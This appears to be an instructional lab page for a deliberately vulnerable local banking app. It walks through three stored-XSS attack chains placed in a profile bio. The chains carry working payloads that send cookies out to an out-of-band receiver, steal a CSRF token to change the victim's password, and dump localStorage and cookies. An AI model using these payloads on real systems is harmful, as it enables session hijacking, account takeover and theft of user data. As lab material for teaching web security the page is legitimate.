M15 — Attack Chain Lab

These attacks require the ChainBank server running at localhost:5000 and you being logged in as alice.

Start the server first: make py in module_15/ — then log in at localhost:5000/auth/login (alice / password123)

Chain 1 — Cookie Theft → Session Hijack

Paste this as alice's bio. When the admin visits /auth/users, the payload fires and sends cookie to OOB receiver.
<img src=x onerror="new Image().src='http://localhost:5001/oob?c='+encodeURIComponent(document.cookie)">
Open Profile page
Paste payload into bio → save → watch OOB receiver (terminal)

Chain 2 — CSRF Token Theft → Password Change

2-step async chain: GET /auth/settings to read the CSRF token, then POST /auth/change-password using it.
<img src=x onerror=" fetch('/auth/settings') .then(r => r.text()) .then(html => { const token = (html.match(/name=['\"]csrf['\"].*?value=['\"]([^'"]+)/s)||[])[1]||''; return fetch('/auth/change-password', { method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'}, body: 'csrf=' + encodeURIComponent(token) + '&new_password=hacked123' }); }) .then(r => r.json()) .then(d => new Image().src = 'http://localhost:5001/oob?result='+encodeURIComponent(JSON.stringify(d))) ">
After saving this bio → OOB will show {"ok":true,"message":"Password changed for alice"}

Chain 3 — localStorage + Cookie Dump

Exfiltrates all client-side state in one request.
<img src=x onerror=" fetch('http://localhost:5001/oob', { method: 'POST', body: JSON.stringify({ cookie: document.cookie, ls: JSON.stringify(localStorage), url: location.href, ua: navigator.userAgent }) }) ">
